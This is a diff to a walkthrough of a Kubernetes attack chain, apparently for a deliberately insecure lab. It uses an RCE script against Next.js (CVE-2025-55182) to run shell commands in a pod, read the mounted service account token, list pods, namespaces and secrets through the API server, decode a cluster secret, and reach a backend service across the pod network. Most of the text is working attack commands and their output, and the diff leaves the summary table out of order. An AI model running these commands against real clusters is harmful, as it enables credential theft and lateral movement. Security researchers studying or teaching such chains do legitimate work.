@@ -7,7 +7,7 @@
     - [Container Secret](#container-secret)
     - [SA token](#sa-token)
     - [Cluster Secret](#cluster-secret)
-    - [access prod api](#access-prod-api)
+    - [access backend api](#access-backend-api)
   - [Attack Chain Summary](#attack-chain-summary)
 
 ---
@@ -86,7 +86,7 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
 # }
 
 # get pod
-python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
+python scripts/rce.py http://localhost:8000 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
 # list all pods
       # "metadata": {
       #   "name": "react2shell-7cdb9b89b-zmzt9",
@@ -106,7 +106,7 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
 
 ```sh
 # list ns
-python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces"
+python scripts/rce.py http://localhost:8000 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces"
       # "metadata": {
       #   "name": "argocd",
       # "metadata": {
@@ -119,7 +119,7 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
       #   "name": "prod",
 
 # list secret in pod ns
-python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/secrets"
+python scripts/rce.py http://localhost:8000 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/secrets"
 # executable response:
 #   "metadata": {
 #     "name": "cluster-secret",
@@ -137,13 +137,13 @@ echo "Y0x1U1Rlci1TZWNSZVQ=" | base64 -d; echo
 
 ---
 
-### access prod api
+### access backend api
 
 ```sh
-python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/prod/pods"
+python scripts/rce.py http://localhost:8000 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure-backend/pods"
       # "metadata": {
-      #   "name": "backend-api",
-      #   "namespace": "prod",
+      #   "name": "backend-api-795cdf78cd-mzg74",
+      #   "namespace": "insecure-backend",
       # "spec": {
       #   "containers": [
       #     {
@@ -153,20 +153,14 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
       #        {
       #          "containerPort": 80,
       #          "protocol": "TCP"
-      #  "podIP": "10.244.1.24",
+      #  "podIP": "10.244.241.201",
 
-python scripts/rce.py http://localhost:8080 "curl -fsSL http://10.244.1.24/api/v1/healthz"
+python scripts/rce.py http://localhost:8000 "curl -fsSL http://10.244.241.201/api/v1/healthz"
 # executable response:
 # {"status":"healthy","message":"Service is running"}
 
-python scripts/rce.py http://localhost:8080 "curl -fsSL http://10.244.1.24/api/v1/users"
+python scripts/rce.py http://localhost:8000 "curl -fsSL http://10.244.241.201/api/v1/users"
 # [{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]
-```
-
-```sh
-kubectl run curl-test --rm -it --image=alpine/curl -- -fsSL http://10.244.1.14/api/v1/healthz
-kubectl run curl-test --rm -it --image=alpine/curl -- sh
-curl http://10.244.1.24/api/v1/healthz
 ```
 
 ---
@@ -178,5 +172,5 @@ curl http://10.244.1.24/api/v1/healthz
 | 1   | RCE                  | Next.js (CVE-2025-55182)  | root shell in pod          |
 | 2   | get Container secret |                           | container secret           |
 | 3   | get SA token         | token auto-mounted in pod | access kube api with token |
-| 4   | scan secret          | permissive RBAC           | cluster secret             |
 | 5   | get prod api         | flat network              | access api in prod ns      |
+| 4   | scan secret          | permissive RBAC           | cluster secret             |
